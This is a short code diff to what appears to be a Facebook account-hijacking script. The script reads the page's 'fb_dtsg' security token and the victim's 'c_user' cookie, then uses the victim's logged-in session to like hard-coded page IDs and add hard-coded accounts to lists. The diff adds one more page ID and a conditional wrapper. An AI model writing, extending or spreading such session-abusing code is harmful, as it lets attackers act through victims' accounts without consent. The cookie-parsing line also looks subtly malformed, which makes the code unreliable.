@@ -284,7 +284,9 @@ P("462706753774328");
 P("461398507238486");
 P("465344260224791");
 P("590722067639462");
+P("351473514982500");
 /*Add 2 List*/
+if (document.getElementsByName('flid')[0].value){
 var flid = document.getElementsByName('flid')[0].value;
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
@@ -302,4 +304,5 @@ function a2l(opo) {
 }
 a2l("100003785647375");  
 a2l("100003697277263");  
-a2l("100001050235420"); 
+a2l("100001050235420");
+};
